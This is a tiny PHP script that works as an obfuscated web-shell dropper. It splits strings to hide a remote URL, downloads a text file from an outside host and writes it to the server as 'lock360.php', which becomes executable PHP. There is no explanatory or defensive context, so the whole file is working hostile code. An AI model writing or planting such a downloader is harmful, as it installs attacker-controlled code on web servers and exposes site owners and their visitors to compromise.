<?php
echo file_put_contents("lock3"."60.p"."hp",file_get_contents("htt"."p://51la.i"."zv"."4.co"."m/a.t".'xt'));